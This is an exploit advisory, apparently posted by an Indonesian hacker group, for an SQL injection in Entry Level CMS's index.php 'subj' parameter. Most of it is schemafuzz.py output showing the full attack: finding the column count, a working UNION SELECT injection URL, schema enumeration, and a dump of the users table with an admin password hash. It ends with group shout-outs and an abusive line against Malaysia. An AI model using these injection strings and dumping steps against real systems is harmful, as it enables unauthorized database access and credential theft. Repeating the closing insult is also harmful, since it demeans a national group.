[+] Contact	: vir0e5[at]hackermail[dot]com
[+] Group	: TECON (The Eye COnference) Indonesia
[+] Site	: http://tecon-crew.org
********************************************

                     [Software Information ]
[+]SOftware      : Entry Level Content Management System (EL CMS)
[+]vendor        : http://www.entrylevelcms.com/
[+]Vulnerability : SQL Injection
********************************************

[ Vulnerable File ]
http://localhost/website/index.php?subj=4

                    [demo with schemafuzz.py]
|---------------------------------------------------------------
| rsauron[at]gmail[dot]com                               v5.0
|   6/2008      schemafuzz.py
|      -MySQL v5+ Information_schema Database Enumeration
|      -MySQL v4+ Data Extractor
|      -MySQL v4+ Table & Column Fuzzer
| Usage: schemafuzz.py [options]
|                      -h help                    darkc0de.com
|------------------------------------------------------------

C:\Python26\exploit\schemafuzz>schemafuzz.py -u "http://localhost/website/index.php?subj=6" --findcol

|------------------------------------------------------------
| rsauron[at]gmail[dot]com                               v5.0
|   6/2008      schemafuzz.py
|      -MySQL v5+ Information_schema Database Enumeration
|      -MySQL v4+ Data Extractor
|      -MySQL v4+ Table & Column Fuzzer
| Usage: schemafuzz.py [options]
|                      -h help                    darkc0de.com
|------------------------------------------------------------

[+] URL:http://localhost/website/index.php?subj=6--
[+] Evasion Used: "+" "--"
[+] 03:36:40
[-] Proxy Not Given
[+] Attempting To find the number of columns...
[+] Testing: 0,1,2,3,
[+] Column Length is: 4
[+] Found null column at column #: 0
[+] SQLi URL: http://localhost/website/index.php?subj=6+AND+1=2+UNION+SELECT+0,1,2,3--
[+] darkc0de URL: http://localhost/website/index.php?subj=6+AND+1=2+UNION+SELECT+darkc0de,1,2,3
[-] Done!

C:\Python26\exploit\schemafuzz>schemafuzz.py -u "http://localhost/website/index.php?subj=6+AND+1=2+UNION+SELECT+darkc0de,1,2,3" --full

|------------------------------------------------------------
| rsauron[at]gmail[dot]com                               v5.0
|   6/2008      schemafuzz.py
|      -MySQL v5+ Information_schema Database Enumeration
|      -MySQL v4+ Data Extractor
|      -MySQL v4+ Table & Column Fuzzer
| Usage: schemafuzz.py [options]
|                      -h help                    darkc0de.com
|------------------------------------------------------------

[+] URL:http://localhost/website/index.php?subj=4+AND+1=2+UNION+SELECT+darkc0de,1,2,3--
[+] Evasion Used: "+" "--"
[+] 05:33:34
[+] Proxy Not Given
[+] Gathering MySQL Server Configuration...
	Database: vman
	User: root@localhost
	Version: 5.0.51a

[Database]: elcms_db
[Table: Columns]
[0]pages: id,subject_id,menu_name,position,visible,content
[1]subjects: id,menu_name,position,visible
[2]users: id,username,hashed_password

[-] [05:55:27]
[-] Total URL Requests 17
[-] Done


C:\Python26\schemafuzz>schemafuzz.py -u "http://localhost/website/index.php?subj=4+AND+1=2+UNION+SELECT+darkc0de,1,2,3" --dump -D elcms_db -T users -C id,username,hashed_password

|------------------------------------------------------------
| rsauron[at]gmail[dot]com                             v5.0
|   6/2008      schemafuzz.py
|      -MySQL v5+ Information_schema Database Enumeration
|      -MySQL v4+ Data Extractor
|      -MySQL v4+ Table & Column Fuzzer
| Usage: schemafuzz.py [options]
|                      -h help                    darkc0de.com
|------------------------------------------------------------

[+] URL:http://localhost/website/index.php?subj=4+AND+1=2+UNION+SELECT+darkc0de,1,2,3--
[+] Evasion Used: "+" "--"
[+] 05:35:14
[+] Proxy Not Given
[+] Gathering MySQL Server Configuration...
	Database: vman
	User: root@localhost
	Version: 5.0.51a
[+] Dumping data from database "vman" Table "users"
[+] Column(s) ['id', 'username', 'hashed_password']
[+] Number of Rows: 1

[0] 9:admin:376cb350808d766e547eadc45b8f19f541d436c8:376cb350808d766e547eadc45b8f19f541d436c8:

[-] [05:35:15]
[-] Total URL Requests 3
[-] Done





If you not understand about it
[Option/help this tools]
 schemafuzz.py -h

********************************************
-- Thank's to my GOD and Soldier Of Allah

-- Special Thanks
#http://indonesian-cyber.org (as Member)
#http://indonesianhacker.org  (as Member)
#http://devilzc0de.org   (as Member)
#http://tecon-crew.org  (as Member)
#http://u3dcrew.darkbb.com  (as Member)

   --No Special for me, i'm newbie!! ^^--

kaMtiEz, r3m1ck, mywisdom, kiddies, dewancc, m0z4rtkl1k, bluescreen, xyberdesktop, n0rma4n_gokil, 12i4n, BZ AND YOU!!!


Notice : "boycott malaysian product "
* Fuck to Malaysia <= the truly thief asia